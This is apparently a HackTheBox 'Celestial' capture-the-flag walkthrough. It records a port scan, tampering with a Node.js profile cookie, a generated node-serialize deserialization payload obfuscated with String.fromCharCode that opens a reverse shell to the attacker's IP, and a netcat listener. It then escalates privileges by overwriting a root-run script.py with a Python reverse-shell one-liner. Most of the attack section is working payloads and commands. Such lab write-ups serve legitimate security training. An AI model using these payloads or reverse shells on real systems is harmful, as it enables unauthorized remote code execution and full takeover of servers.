---
title: "HackTheBox - Celestial"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

root@kali:~# nmap -sV -sC 10.10.10.85  
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-28 16:04 CEST  
Nmap scan report for 10.10.10.85  
Host is up (0.046s latency).  
Not shown: 999 closed ports  
PORT STATE SERVICE VERSION  
3000/tcp open http Node.js Express framework  
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 26.92 seconds

bild1

Hey Dummy 2 + 2 is 22

bild2

Cookie: profile={"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"} Ã

Cookie: profile={"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"0"} Ã

encode

bild3

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

https://hd7exploit.wordpress.com/2017/05/29/exploiting-node-js-deserialization-bug-for-remote-code-execution-cve-2017-5941/

https://github.com/hoainam1989/training-application-security/blob/master/shell/node_shell.py

root@kali:~# python node_shell.py

Usage: node_shell.py <TYPE> <HOST> <PORT> <ENCODE>  
Help:  
-c : Run some linux commands (ls,cat...)  
-r : Get payload reverse shell  
-b : Get payload bind shell  
-h : IP address in case of reverse shell  
-p : Port  
-e : Encode shell  
-o : Create a object contain payload with Immediately invoked function expression (IIFE)

root@kali:~# python node_shell.py -r -h 10.10.15.234 -p 1337 -e -o

=======> Happy hacking <======

{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,32,32,32,32,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,32,32,32,32,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,32,32,32,32,72,79,83,84,61,34,49,48,46,49,48,46,49,53,46,50,51,52,34,59,10,32,32,32,32,80,79,82,84,61,34,49,51,51,55,34,59,10,32,32,32,32,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,32,32,32,32,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,32,32,32,32,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,10,32,32,32,32,99,40,72,79,83,84,44,80,79,82,84,41,59,10,32,32,32,32))}()"}

root@kali:~#

bild4

encode

== zu %3d  url encode

root@kali:~# nc -lnvp 1337

root@kali:~# nc -lnvp 1337  
listening on [any] 1337 ...  
connect to [10.10.15.234] from (UNKNOWN) [10.10.10.85] 54070  
Connected!  
python -c "import pty;pty.spawn('/bin/bash')"  
sun@sun:~$

sun@sun:~$ ls -alh  
ls -alh  
total 156K  
drwxr-xr-x 21 sun sun 4.0K Aug 28 06:45 .  
drwxr-xr-x 3 root root 4.0K Sep 19 2017 ..  
-rw------- 1 sun sun 1 Mar 4 15:24 .bash_history  
-rw-r--r-- 1 sun sun 220 Sep 19 2017 .bash_logout  
-rw-r--r-- 1 sun sun 3.7K Sep 19 2017 .bashrc  
drwx------ 13 sun sun 4.0K Nov 8 2017 .cache  
drwx------ 16 sun sun 4.0K Sep 20 2017 .config  
drwx------ 3 root root 4.0K Sep 21 2017 .dbus  
drwxr-xr-x 2 sun sun 4.0K Sep 19 2017 Desktop  
-rw-r--r-- 1 sun sun 25 Sep 19 2017 .dmrc  
drwxr-xr-x 2 sun sun 4.0K Aug 28 09:28 Documents  
drwxr-xr-x 2 sun sun 4.0K Sep 19 2017 Downloads  
-rw-r--r-- 1 sun sun 8.8K Sep 19 2017 examples.desktop  
drwx------ 2 sun sun 4.0K Sep 21 2017 .gconf  
drwx------ 3 sun sun 4.0K Aug 28 06:16 .gnupg  
drwx------ 2 root root 4.0K Sep 21 2017 .gvfs  
-rw------- 1 sun sun 6.6K Aug 28 06:16 .ICEauthority  
drwx------ 3 sun sun 4.0K Sep 19 2017 .local  
drwx------ 4 sun sun 4.0K Sep 19 2017 .mozilla  
drwxr-xr-x 2 sun sun 4.0K Sep 19 2017 Music  
drwxrwxr-x 2 sun sun 4.0K Sep 19 2017 .nano  
drwxr-xr-x 47 root root 4.0K Sep 19 2017 node_modules  
-rw-rw-r-- 1 sun sun 20 Sep 19 2017 .node_repl_history  
drwxrwxr-x 57 sun sun 4.0K Sep 19 2017 .npm  
-rw-r--r-- 1 root root 21 Aug 28 10:00 output.txt  
drwxr-xr-x 2 sun sun 4.0K Sep 19 2017 Pictures  
-rw-r--r-- 1 sun sun 655 Sep 19 2017 .profile  
drwxr-xr-x 2 sun sun 4.0K Sep 19 2017 Public  
-rw-rw-r-- 1 sun sun 66 Sep 20 2017 .selected_editor  
-rw-rw-r-- 1 sun sun 870 Sep 20 2017 server.js  
-rw-rw-r-- 1 sun sun 610 Aug 28 06:45 shell1.js  
-rw-r--r-- 1 sun sun 0 Sep 19 2017 .sudo_as_admin_successful  
drwxr-xr-x 2 sun sun 4.0K Sep 19 2017 Templates  
drwxr-xr-x 2 sun sun 4.0K Sep 19 2017 Videos  
-rw------- 1 sun sun 48 Aug 28 06:16 .Xauthority  
-rw------- 1 sun sun 82 Aug 28 06:16 .xsession-errors  
-rw------- 1 sun sun 1.3K Mar 7 08:33 .xsession-errors.old

sun@sun:~$ cat output.txt  
cat output.txt  
Script is running...

sun@sun:~$ cd Documents  
cd Documents  
sun@sun:~/Documents$ ls -alh  
ls -alh  
total 16K  
drwxr-xr-x 2 sun sun 4.0K Aug 28 09:28 .  
drwxr-xr-x 21 sun sun 4.0K Aug 28 06:45 ..  
-rw-rw-r-- 1 sun sun 29 Sep 21 2017 script.py  
-rw-rw-r-- 1 sun sun 33 Sep 21 2017 user.txt  
sun@sun:~/Documents$ cat user.txt  
cat user.txt  
9a0##########################b0f  
sun@sun:~/Documents$ cat script.py  
cat script.py  
print "Script is running..."

sun@sun:~/Documents$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.234",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > script.py  
bprocess.call(["/bin/sh","-i"]);' > script.pycket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.234",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=su  
sun@sun:~/Documents$

root@kali:~# nc -lnvp 1234  
listening on [any] 1234 ...  
connect to [10.10.15.234] from (UNKNOWN) [10.10.10.85] 59534  
/bin/sh: 0: can't access tty; job control turned off  
# id  
uid=0(root) gid=0(root) groups=0(root)  
# cat /root/root.txt  
ba1##########################95a